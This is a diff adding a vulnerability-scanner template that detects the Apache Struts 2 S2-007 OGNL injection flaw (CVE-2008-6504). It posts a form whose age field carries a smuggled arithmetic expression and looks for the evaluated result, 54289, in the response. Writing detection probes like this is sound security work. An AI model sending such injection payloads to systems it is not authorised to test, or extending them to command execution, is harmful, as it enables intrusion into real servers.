@@ -1,0 +1,36 @@
+id: local-struts2-s2-007-math
+
+info:
+  name: Struts2 S2-007 OGNL Injection via Type Conversion Validation (CVE-2008-6504)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-007 (CVE-2008-6504) allows OGNL injection when a field
+    with an integer type-conversion validation rule receives a string value.
+    The server splices the user-supplied value into an OGNL expression string
+    ('value') which is then evaluated. Safe math probe injects %{233*233} into
+    the age field; the result 54289 should appear in the response body on error.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-007
+    - https://nvd.nist.gov/vuln/detail/CVE-2008-6504
+  tags: safe-poc,struts2,s2-007,cve,cve2008,ognl,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user.action"
+      - "{{BaseURL}}/User.action"
+      - "{{BaseURL}}/index.action"
+    body: "name=foo&email=foo%40foo.com&age=%27+%2B+%28233*233%29+%2B+%27"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 200
